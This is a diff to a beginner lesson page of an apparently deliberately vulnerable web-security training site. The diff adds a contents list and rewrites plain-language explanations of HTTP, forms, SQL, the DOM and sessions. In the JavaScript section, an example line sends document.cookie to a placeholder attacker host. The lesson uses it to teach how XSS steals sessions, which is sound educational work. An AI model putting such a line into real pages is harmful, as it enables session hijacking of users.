@@ -16,7 +16,25 @@ academy_layout_start($lesson['title']);
     </div>
 </header>
 
-<section class="academy-block">
+<nav class="academy-block" style="background:#f8fafc; border:1px solid #e2e8f0; border-radius:12px; padding:20px 24px;">
+    <strong style="font-size:0.95rem; color:#0f172a;">Contents</strong>
+    <ol style="margin:10px 0 0 0; padding-left:1.4em; line-height:2;" start="0">
+        <li><a href="#s0">Who this page is for</a></li>
+        <li><a href="#s1">The three actors: client, server, database</a></li>
+        <li><a href="#s2">HTTP requests and responses</a></li>
+        <li><a href="#s3">HTML and forms</a></li>
+        <li><a href="#s4">PHP basics</a></li>
+        <li><a href="#s5">SQL and databases</a></li>
+        <li><a href="#s6">JavaScript and the DOM</a></li>
+        <li><a href="#s7">Sessions, cookies, and what "logged in" really means</a></li>
+        <li><a href="#s8">Browser dev tools and tooling you will actually use</a></li>
+        <li><a href="#s9">The security mindset in one paragraph</a></li>
+        <li><a href="#s10">Which section powers which lab</a></li>
+        <li><a href="#s11">Ready?</a></li>
+    </ol>
+</nav>
+
+<section class="academy-block" id="s0">
     <h2>0. Who this page is for</h2>
     <p>
         Every other lab assumes you already understand how a web page is delivered
@@ -32,7 +50,7 @@ academy_layout_start($lesson['title']);
 </section>
 
 <!-- 1. CLIENT - SERVER - DATABASE -->
-<section class="academy-block">
+<section class="academy-block" id="s1">
     <h2>1. The three actors: client, server, database</h2>
     <p>
         A modern web app is a conversation between three programs:
@@ -66,7 +84,7 @@ academy_layout_start($lesson['title']);
 </section>
 
 <!-- 2. HTTP -->
-<section class="academy-block">
+<section class="academy-block" id="s2">
     <h2>2. HTTP requests and responses</h2>
     <p>
         HTTP is a plain-text protocol. A request looks like this:
@@ -97,9 +115,19 @@ Set-Cookie: PHPSESSID=xyz789; Path=/
             server error.
         </li>
         <li>
-            <strong>Headers.</strong> Key/value metadata. <code>Cookie</code> goes up,
-            <code>Set-Cookie</code> comes back down, <code>Location</code> drives
-            redirects, <code>Content-Type</code> describes the body.
+            <strong>Headers.</strong> Hidden notes that travel alongside every request
+            and response - the browser and server use them to pass information to
+            each other without it appearing on the page. A few important ones:
+            <ul style="margin-top: 6px;">
+                <li><code>Cookie</code> - sent by the browser on every request so
+                    the server knows who you are (your session).</li>
+                <li><code>Set-Cookie</code> - sent by the server after login to
+                    plant a cookie in your browser for future requests.</li>
+                <li><code>Location</code> - used with a <code>302</code> response
+                    to tell the browser where to redirect.</li>
+                <li><code>Content-Type</code> - tells the browser what kind of
+                    content is in the response (HTML page, image, JSON data, etc.).</li>
+            </ul>
         </li>
         <li>
             <strong>URL anatomy.</strong>
@@ -117,29 +145,44 @@ Set-Cookie: PHPSESSID=xyz789; Path=/
 </section>
 
 <!-- 3. HTML & FORMS -->
-<section class="academy-block">
+<section class="academy-block" id="s3">
     <h2>3. HTML and forms</h2>
     <p>
-        HTML is a tree of <em>elements</em>. Each element is a tag, optionally with
-        attributes and children:
+        HTML is the language that describes what a web page looks like. It is made up
+        of <em>tags</em> - labels wrapped in angle brackets that tell the browser what
+        to show:
     </p>
-    <pre><code>&lt;a href="home.php" class="link"&gt;Home&lt;/a&gt;
-&lt;img src="logo.png" alt="logo"&gt;
-&lt;p&gt;Hello &lt;strong&gt;world&lt;/strong&gt;.&lt;/p&gt;</code></pre>
-    <p>A form is how the browser sends data to the server:</p>
+    <pre><code>&lt;a href="home.php"&gt;Home&lt;/a&gt;          &lt;-- a clickable link
+&lt;img src="logo.png" alt="logo"&gt;      &lt;-- an image
+&lt;p&gt;Hello &lt;strong&gt;world&lt;/strong&gt;.&lt;/p&gt; &lt;-- a paragraph with bold text</code></pre>
+    <p>
+        Each tag can have <em>attributes</em> (like <code>href</code> or
+        <code>src</code>) that give it extra information. Tags can also be nested
+        inside each other - <code>&lt;strong&gt;</code> sits inside
+        <code>&lt;p&gt;</code> in the example above.
+    </p>
+
+    <p>
+        A <strong>form</strong> is the standard way a website collects input from the
+        user and sends it to the server. Here is what a login form looks like in HTML:
+    </p>
     <pre><code>&lt;form action="login.php" method="POST"&gt;
     &lt;input type="text"     name="username"&gt;
     &lt;input type="password" name="password"&gt;
     &lt;button type="submit"&gt;Login&lt;/button&gt;
 &lt;/form&gt;</code></pre>
+    <ul>
+        <li><code>action="login.php"</code> - where the data gets sent.</li>
+        <li><code>method="POST"</code> - how it is sent (the data goes in the
+            request body, not visible in the URL).</li>
+        <li>Each <code>name="..."</code> becomes a key in the POST data. When you
+            click Login, the browser sends:
+            <code>username=carlos & password=1234</code> to <code>login.php</code>.
+        </li>
+    </ul>
+
     <p>
-        When you click submit, the browser builds a POST request to
-        <code>login.php</code> whose body is
-        <code>username=...&amp;password=...</code>. The names of the inputs become the
-        names of the POST parameters.
-    </p>
-    <p>
-        <strong>Escaping.</strong> If a page wants to show user-supplied text safely,
+    <strong>Escaping.</strong> If a page wants to show user-supplied text safely,
         it must encode special characters like <code>&lt;</code>, <code>&gt;</code>,
         <code>"</code> so the browser treats them as text, not as new HTML. In PHP
         this is <code>htmlspecialchars($x)</code>. When a page <em>forgets</em> to do
@@ -154,7 +197,7 @@ Set-Cookie: PHPSESSID=xyz789; Path=/
 </section>
 
 <!-- 4. PHP -->
-<section class="academy-block">
+<section class="academy-block" id="s4">
     <h2>4. PHP basics</h2>
     <p>
         PHP files are mixed HTML and code. Anything inside
@@ -185,17 +228,20 @@ $name = $_GET["name"] ?? "stranger";
         <strong>Why it matters:</strong> every server-side file in this project is
         PHP. To understand a vulnerability you need to read its handler - even
         skim-reading <code>login.php</code>, <code>profile.php</code> and
-        <code>cart.php</code> is enough to find most of the bugs in this academy.
+        <code>cart.php</code> is enough to find most of the vulnerabilities in this academy.
     </p>
 </section>
 
 <!-- 5. SQL & DATABASES -->
-<section class="academy-block">
+<section class="academy-block" id="s5">
     <h2>5. SQL and databases</h2>
     <p>
-        A relational database stores data in <strong>tables</strong>. Each table has
-        named <strong>columns</strong> and many <strong>rows</strong>. You talk to it
-        in <strong>SQL</strong>:
+        Think of a database as a collection of spreadsheets. Each <strong>table</strong>
+        is one spreadsheet (e.g. <code>users</code>, <code>products</code>,
+        <code>reviews</code>). Each <strong>column</strong> is a field (e.g.
+        <code>username</code>, <code>password</code>, <code>email</code>). Each
+        <strong>row</strong> is one record - one user, one product, one review.
+        <strong>SQL</strong> is the language you use to read, add, or change that data:
     </p>
     <pre><code>-- read
 SELECT id, username, email FROM users WHERE id = 1;
@@ -249,50 +295,56 @@ $row = $stmt-&gt;fetch();</code></pre>
 </section>
 
 <!-- 6. JAVASCRIPT & DOM -->
-<section class="academy-block">
+<section class="academy-block" id="s6">
     <h2>6. JavaScript and the DOM</h2>
     <p>
-        JavaScript runs in the browser, <em>not</em> on the server. It can read and
-        change the page (the <strong>DOM</strong> - the live tree of elements), send
-        background HTTP requests, and read cookies that aren't marked
-        <code>HttpOnly</code>.
+        JavaScript is a programming language that runs <em>inside your browser</em>,
+        not on the server. Its job is to make pages interactive - responding to clicks,
+        updating content without reloading, sending data in the background.
     </p>
-    <pre><code>// read URL parts
+    <p>
+        The <strong>DOM</strong> (Document Object Model) is the browser's live,
+        in-memory representation of the page. Think of it as a tree of all the
+        HTML elements currently on screen. JavaScript can read and change any part of
+        it at any time.
+    </p>
+    <pre><code>// read parts of the URL (attacker can control these)
 let id  = new URLSearchParams(location.search).get("id"); // ?id=...
 let tag = location.hash.slice(1);                          // #tag
 
-// change the page
-document.getElementById("title").textContent = "Hi";       // safe
-document.getElementById("title").innerHTML  = userInput;   // DANGEROUS
+// change the page - one safe, one dangerous
+document.getElementById("title").textContent = "Hi";       // treats input as plain text - safe
+document.getElementById("title").innerHTML  = userInput;   // treats input as HTML - DANGEROUS
 
-// steal data
+// send data to another server (used in XSS attacks to steal cookies)
 fetch("http://attacker/?c=" + document.cookie);</code></pre>
     <p>
-        The two key ideas for the XSS labs:
+        The two things that make JavaScript dangerous in the wrong hands:
     </p>
     <ul>
         <li>
-            <code>innerHTML = x</code> tells the browser to <em>parse</em>
-            <code>x</code> as HTML. If <code>x</code> contains
-            <code>&lt;script&gt;</code> or an <code>onerror=</code> attribute, that
-            code executes - in the victim's session, on our site's origin.
+            <strong><code>innerHTML</code> executes HTML.</strong> When you set
+            <code>element.innerHTML = userInput</code>, the browser parses
+            <code>userInput</code> as real HTML. If it contains a
+            <code>&lt;script&gt;</code> tag or an <code>onerror=</code> event handler,
+            that code runs immediately - as if it were part of the original page.
         </li>
         <li>
-            JavaScript that is already running on a page can read
-            <code>document.cookie</code> and POST it elsewhere. That is how an XSS
-            turns into a session-cookie theft.
+            <strong>JavaScript can read and send cookies.</strong> Any script running
+            on a page can access <code>document.cookie</code> and send it to an
+            attacker's server. That is exactly how an XSS attack steals a session.
         </li>
     </ul>
     <p>
-        <strong>Why it matters:</strong> <strong>Reflected</strong>,
-        <strong>Stored</strong> and <strong>DOM</strong> XSS labs each plant one of
-        these payloads through a different channel; CSRF labs use a tiny bit of JS
-        on the attacker's page to auto-submit a form.
+        <strong>Why it matters:</strong> the Reflected, Stored and DOM XSS labs each
+        exploit a different way to get attacker-controlled JavaScript to run in the
+        victim's browser. The CSRF labs use a small JS snippet to auto-submit a hidden
+        form the moment the victim loads the attacker's page.
     </p>
 </section>
 
 <!-- 7. SESSIONS & COOKIES -->
-<section class="academy-block">
+<section class="academy-block" id="s7">
     <h2>7. Sessions, cookies, and what "logged in" really means</h2>
     <p>
         HTTP is stateless - the server forgets you between requests. To keep you
@@ -334,7 +386,7 @@ Cookie: PHPSESSID=abc123</code></pre>
 </section>
 
 <!-- 8. DEV TOOLS & TOOLING -->
-<section class="academy-block">
+<section class="academy-block" id="s8">
     <h2>8. Browser dev tools and tooling you will actually use</h2>
     <p>
         Open dev tools with <kbd>F12</kbd> in any browser. The tabs you need:
@@ -377,7 +429,7 @@ print(s.cookies.get("PHPSESSID"))</code></pre>
 </section>
 
 <!-- 9. SECURITY MINDSET -->
-<section class="academy-block">
+<section class="academy-block" id="s9">
     <h2>9. The security mindset in one paragraph</h2>
     <p>
         Every input that crosses a boundary - URL parameter, form field, cookie,
@@ -392,7 +444,7 @@ print(s.cookies.get("PHPSESSID"))</code></pre>
 </section>
 
 <!-- 10. MAP TO LABS -->
-<section class="academy-block">
+<section class="academy-block" id="s10">
     <h2>10. Which section powers which lab</h2>
     <p>Use this as a "go back and re-read" map once you start the labs.</p>
     <table class="academy-payload">
@@ -448,7 +500,7 @@ print(s.cookies.get("PHPSESSID"))</code></pre>
 </section>
 
 <!-- 11. START -->
-<section class="academy-block">
+<section class="academy-block" id="s11">
     <h2>11. Ready?</h2>
     <p>
         Open the target site in a tab and keep dev tools open while you read each
